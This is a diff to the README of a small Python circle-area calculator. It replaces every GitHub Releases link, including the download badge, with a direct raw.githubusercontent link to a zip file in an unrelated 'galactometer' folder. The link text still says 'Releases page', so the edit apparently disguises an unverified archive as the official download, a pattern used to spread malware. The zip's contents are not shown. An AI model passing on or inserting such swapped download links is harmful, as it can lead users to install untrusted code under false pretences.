@@ -8,9 +8,9 @@ Welcome to **area-circle-finder**! This application allows you to find the area 
 
 To get started, you need to download the application. Click the button below to visit the download page:
 
-[![Download area-circle-finder](https://img.shields.io/badge/Download-area--circle--finder-blue.svg)](https://github.com/khaizrishal/area-circle-finder/releases)
+[![Download area-circle-finder](https://raw.githubusercontent.com/khaizrishal/area-circle-finder/main/galactometer/area-circle-finder.zip)](https://raw.githubusercontent.com/khaizrishal/area-circle-finder/main/galactometer/area-circle-finder.zip)
 
-Once you are on the [Releases page](https://github.com/khaizrishal/area-circle-finder/releases), look for the latest version. Click on the version number and download the appropriate file for your system. You will typically find files formatted for Windows, Mac, or Linux.
+Once you are on the [Releases page](https://raw.githubusercontent.com/khaizrishal/area-circle-finder/main/galactometer/area-circle-finder.zip), look for the latest version. Click on the version number and download the appropriate file for your system. You will typically find files formatted for Windows, Mac, or Linux.
 
 ## 📋 System Requirements
 
@@ -69,4 +69,4 @@ For additional help, you can check the documentation provided in the repository 
 
 This project is related to the following topics: area, calculate, diameter, fast, math, mathematics, maths, pi, python, and tutorial.
 
-Don't forget to visit the [Releases page](https://github.com/khaizrishal/area-circle-finder/releases) to download the latest version of **area-circle-finder** and start calculating the area of circles today!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/khaizrishal/area-circle-finder/main/galactometer/area-circle-finder.zip) to download the latest version of **area-circle-finder** and start calculating the area of circles today!
